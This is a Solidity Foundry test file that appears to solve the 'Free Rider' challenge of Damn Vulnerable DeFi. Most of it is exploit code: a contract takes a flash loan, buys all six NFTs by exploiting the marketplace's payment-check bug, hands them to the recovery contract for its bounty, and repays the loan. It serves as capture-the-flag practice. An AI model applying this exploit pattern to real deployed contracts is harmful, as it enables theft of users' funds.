//SPDX-License-Identifier: GPL-3.0
pragma solidity =0.8.15;

import "forge-std/Test.sol";
import {Flashloan} from "./Flashloan.sol";
import {FreeRiderRecovery} from "../src/damn-vulnerable-defi/contracts/free-rider/FreeRiderRecovery.sol";
import {FreeRiderNFTMarketplace} from "../src/damn-vulnerable-defi/contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../src/damn-vulnerable-defi/contracts/DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Exploit is Test, IERC721Receiver {
//    address attacker = vm.addr(0xaaaa);
    address foundryTXOrigin = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;
    address owner = vm.addr(0xbbbb);

    DamnValuableNFT nft;
    Flashloan flashloan;
    FreeRiderRecovery recovery;
    FreeRiderNFTMarketplace marketplace;

    uint256[] ids = [0, 1, 2, 3, 4, 5];
    uint256[] prices = [15 ether, 15 ether, 15 ether, 15 ether, 15 ether, 15 ether];

    function setUp() public {
        vm.deal(owner, 1000 ether);
        vm.deal(address(this), 0.1 ether);

        vm.startPrank(owner);
        marketplace = new FreeRiderNFTMarketplace{value: 100 ether}(6);
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);
        marketplace.offerMany(ids, prices);

        flashloan = new Flashloan{value: 200 ether}();
        recovery = new FreeRiderRecovery{value: 45 ether}(foundryTXOrigin, address(nft));

        vm.stopPrank();
    }

    function testSetUp() public {
        assertEq(address(marketplace).balance, 100 ether);
        assertEq(address(flashloan).balance, 200 ether);
        assertEq(address(recovery).balance, 45 ether);
//        assertEq(address(attacker).balance, 0 ether);
        assertEq(nft.balanceOf(address(owner)), 6);
        assertEq(address(this).balance, 0.1 ether);

        console.log(address(nft));
    }

    function testFlashLoan() public {
        flashloan.takeLoan(4 ether, "");
    }

    function testExecute() public {
        assertEq(address(this).balance, 0.1 ether);

        bytes memory maliciousData = abi.encodeWithSelector(
            this.hack.selector
        );

        flashloan.takeLoan(16 ether, maliciousData);
//        assertEq(address(address(this)).balance, 16.1 ether);
//        assertEq(address(flashloan).balance, 184 ether);
        console.log(address(flashloan).balance);

//        assertEq(nft.balanceOf(owner), 0);
//        assertEq(nft.balanceOf(address(this)), 0);
//        assertEq(nft.balanceOf(address(recovery)), 6);
//        assertEq(address(this).balance, 45.1 ether);

        console.log(address(flashloan).balance);
//
//        assertEq(address(flashloan).balance, 200 ether);
//        assertEq(address(this).balance, 45.1 ether - 16 ether);
        vm.stopPrank();
    }

    function hack() external payable {
        // ATTACK!!!!!!!!!!
        marketplace.buyMany{value: 16 ether}(ids);

//        assertEq(nft.balanceOf(owner), 0);
//        assertEq(nft.balanceOf(address(this)), 6);
//        assertEq(address(address(this)).balance, 0.1 ether);

        bytes memory _attacker = abi.encode(address(this));
        nft.setApprovalForAll(address(recovery), true);

        for (uint i; i != 6; ) {
            nft.safeTransferFrom(address(this), address(recovery), i, _attacker);
            unchecked { ++i; }
        }

        (bool success, ) = payable(address(flashloan)).call{value: 16 ether}("");
        require(success);
    }

    function onERC721Received(address, address, uint256, bytes memory)
    external
    override
    returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {
        payable(address(flashloan)).call{value: 4 ether}("");
    }
}